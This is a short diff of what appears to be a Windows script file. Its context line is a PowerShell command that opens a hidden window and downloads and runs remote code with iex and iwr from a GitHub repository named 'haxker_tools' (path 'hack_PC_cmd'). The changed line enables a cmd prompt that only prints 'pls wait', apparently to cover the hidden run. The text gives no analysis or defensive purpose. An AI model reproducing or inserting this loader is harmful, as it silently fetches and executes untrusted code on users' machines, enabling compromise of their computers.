@@ -1,3 +1,3 @@
 powershell -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-Command iex (iwr ''https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/all_steps.txt'' -UseBasicParsing).Content'"
 
-# cmd /k "@echo off & cls & echo pls wait"
+cmd /k "@echo off & cls & echo pls wait"
